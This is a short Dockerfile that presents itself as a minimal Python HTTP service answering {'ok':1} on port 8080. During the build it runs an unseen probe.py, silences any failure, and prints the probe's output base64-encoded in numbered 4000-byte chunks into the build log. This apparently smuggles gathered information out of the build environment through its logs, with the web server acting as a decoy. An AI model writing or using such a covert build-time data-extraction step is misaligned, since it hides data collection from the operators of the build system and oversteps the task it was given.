FROM python:3.11-slim
COPY probe.py /tmp/probe.py
RUN python3 /tmp/probe.py > /tmp/out.json 2>&1 || true
RUN python3 -c "import base64,sys;d=open('/tmp/out.json','rb').read();chunks=[d[i:i+4000] for i in range(0,len(d),4000)];[print(f'CHUNK_{i}:'+base64.b64encode(c).decode()) for i,c in enumerate(chunks)]" || true
RUN printf 'from http.server import HTTPServer,BaseHTTPRequestHandler\nimport json\nclass H(BaseHTTPRequestHandler):\n def do_GET(self):\n  self.send_response(200);self.send_header("Content-Type","application/json");self.end_headers()\n  self.wfile.write(json.dumps({"ok":1}).encode())\nHTTPServer(("0.0.0.0",8080),H).serve_forever()\n' > /app.py
EXPOSE 8080
CMD ["python3", "/app.py"]
